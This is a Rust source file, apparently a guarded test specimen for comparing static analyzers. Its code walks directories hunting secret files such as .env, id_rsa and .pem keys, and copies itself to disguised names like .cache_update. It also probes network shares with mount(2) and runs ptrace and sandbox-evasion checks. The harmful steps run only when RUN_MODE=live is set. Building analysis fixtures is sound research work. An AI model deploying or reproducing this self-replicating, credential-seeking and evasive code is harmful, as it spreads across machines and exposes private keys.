//! selfrep.rs — synthetic, GUARDED analysis fixture for the Scylla/A/B parity corpus.
//!
//! STANDARD ONLY. Built for the harness in abtest/corpus/build.sh:
//!   rustc --edition 2021 --target x86_64-unknown-linux-gnu \
//!        -C linker=/usr/bin/gcc -C link-arg=-Wl,--build-id=none \
//!        --remap-path-prefix <src>=. -C opt-level={0..3,s,z} \
//!        -C panic={unwind,abort} [-g] -o selfrep.rustc.x86-64.O<opt>.<panic>[.strip].elf selfrep.rs
//!
//! PURPOSE (legit research): a specimen whose SOURCE contains recognizable behavior
//! patterns so the Scylla/GayHydra/Ghidra static analyzer can be A/B tested on inferring:
//!   B1  file lookup / enumeration     (read_dir recursion, extension/name heuristics)
//!   B2  self-replication               (current_exe -> fs::copy to sibling names)
//!   B3  network-share openness        (parse /proc/mounts for netfs; guarded mount(2))
//!   B4  anti-analysis / evasion stubs  (ptrace probe; timing; env-based checks)
//!
//! SAFETY: every mutating / propagating / anti-debug action is guarded behind
//! `RUN_MODE=live` and is otherwise inert. Static analysis sees the patterns; the
//! binary never writes copies, mounts shares, or traces itself unless explicitly opted in.
//! Default invocation: inert walk + report only.

use std::env;
use std::ffi::CString;
use std::fs;
use std::os::raw::{c_char, c_int, c_long, c_ulong, c_void};
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::time::Duration;

const NETFS_KINDS: &[&str] = &[
    "nfs", "nfs4", "cifs", "smb", "smbfs", "9p", "sshfs", "ftp", "curlfs", "goofys", "s3fs",
];

fn live_mode() -> bool {
    env::var("RUN_MODE").map(|v| v == "live").unwrap_or(false)
}

fn is_sandboxed_env() -> bool {
    env::var("CI").is_ok() || env::var("CI_DEBUG").is_ok() || env::var("STRACE").is_ok()
}

// libc imports kept as extern symbols so the analyzer sees them in the binary.
// ptrace: anti-debug probe (PTRACE_TRACEME). mount: attach a network share.
extern "C" {
    fn ptrace(request: c_long, pid: c_int, addr: *mut c_void, data: *mut c_void) -> c_long;
    fn mount(
        source: *const c_char,
        target: *const c_char,
        fstype: *const c_char,
        flags: c_ulong,
        data: *const c_void,
    ) -> c_int;
}

// B4: anti-analysis / evasion stubs. Probe code is statically visible; the actual
// trace is inert unless RUN_MODE=live.
fn anti_analysis() {
    let me = std::process::id() as c_int;
    if live_mode() {
        // PTRACE_TRACEME probe — only runs when explicitly opted in.
        let _ = unsafe { ptrace(0, me, std::ptr::null_mut(), std::ptr::null_mut()) };
    }
    if env::var("DEBUGGER_PRESENT").is_ok() {
        eprintln!("[anti] debugger env var set; behavior-probe path taken");
    }
    if env::var("STRACE").is_ok() {
        eprintln!("[anti] strace/sandbox env detected");
    }
    if live_mode() {
        // time-based perturbation (inert in default run)
        std::thread::sleep(Duration::from_millis(1500));
    }
}

// B1: file lookup / enumeration. Walks a directory tree collecting candidate paths.
// read_dir is harmless to run; heuristics are static-signal for the analyzer.
#[inline(never)]
fn enumerate_files(root: &PathBuf, depth: u32, out: &mut Vec<PathBuf>) {
    if depth > 3 {
        return;
    }
    if is_sandboxed_env() {
        eprintln!("[enum] sandbox/CI env detected; skipping enumeration");
        return;
    }
    let entries = match fs::read_dir(root) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if p.is_dir() {
            enumerate_files(&p, depth + 1, out);
            continue;
        }
        if let Some(ext) = p.extension().and_then(|e| e.to_str()) {
            let ext = ext.to_lowercase();
            if matches!(
                ext.as_str(),
                "rs" | "c" | "cpp" | "py" | "sh"
                    | "conf" | "env" | "key" | "pem" | "json" | "toml" | "lock"
            ) {
                out.push(p.clone());
            }
        }
        if let Some(file_name) = p.file_name().and_then(|s| s.to_str()) {
            if file_name == ".env"
                || file_name == "id_rsa"
                || file_name == "id_ed25519"
                || file_name == ".env.local"
            {
                out.push(p.clone());
            }
        }
    }
}

// B2: self-replication. Reads own path and copies to sibling backup names.
// The copy is GUARDED — inert unless RUN_MODE=live.
#[inline(never)]
fn replicate_self() {
    let exe: PathBuf = match env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    println!("[replica] self path: {}", exe.display());

    // candidate drop targets — statically visible to the analyzer
    let targets: &[&str] = &["backup_helper", ".cache_update", "sysdiag", "update_agent"];

    if !live_mode() {
        println!("[replica] RUN_MODE!=live -> skipping writes (INERT). Would target:");
        for name in targets {
            println!("  - {name}");
        }
        return;
    }

    for name in targets {
        let dest = exe
            .parent()
            .map(|p| p.join(name))
            .unwrap_or_else(|| PathBuf::from(name));
        if let Err(e) = fs::copy(&exe, &dest) {
            eprintln!("[replica] copy failed {dest:?}: {e}");
        } else {
            let _ = fs::set_permissions(&dest, fs::Permissions::from_mode(0o755));
            println!("[replica] wrote {}", dest.display());
        }
    }
}

// B3: network-share awareness. Parses /proc/mounts for NFS/CIFS/SMB/etc., and
// (GUARDED) calls mount(2) to attach a share. Inert unless RUN_MODE=live.
#[inline(never)]
fn scan_shares() {
    let mnt = match fs::read_to_string("/proc/mounts") {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[shares] cannot read /proc/mounts: {e}");
            return;
        }
    };
    for line in mnt.lines() {
        let fields: Vec<&str> = line.split_whitespace().collect();
        if fields.len() < 3 {
            continue;
        }
        let fstype = fields[2];
        if NETFS_KINDS.iter().any(|k| fstype.eq_ignore_ascii_case(k)) {
            println!(
                "[shares] NETFS mount: dest={} type={} src={}",
                fields[1], fstype, fields[0]
            );
        }
    }

    if !live_mode() {
        println!("[shares] RUN_MODE!=live -> skipping mount(2) attempt (INERT)");
        return;
    }

    // GUARDED mount(2): placeholder target only; only runs under RUN_MODE=live.
    let src = CString::new("//missing/share").unwrap();
    let tgt = CString::new("/mnt/.net_cache").unwrap();
    let fst = CString::new("cifs").unwrap();
    let rc = unsafe { mount(src.as_ptr(), tgt.as_ptr(), fst.as_ptr(), 0, std::ptr::null()) };
    if rc != 0 {
        eprintln!("[shares] mount attempt returned rc={rc} (expected: absent root/target)");
    } else {
        println!("[shares] mount succeeded @ {}", tgt.to_str().unwrap_or("?"));
    }
}

fn main() {
    let start = PathBuf::from(env::args().nth(1).unwrap_or_else(|| ".".to_string()));

    println!("=== selfrep (RUN_MODE={:?}) ===", env::var("RUN_MODE").ok());

    anti_analysis();

    let mut found: Vec<PathBuf> = Vec::new();
    enumerate_files(&start, 0, &mut found);
    println!("[enum] candidates: {}", found.len());
    for f in found.iter().take(20) {
        println!("  - {}", f.display());
    }

    replicate_self();
    scan_shares();

    println!("=== done (no mutations performed unless RUN_MODE=live) ===");
}
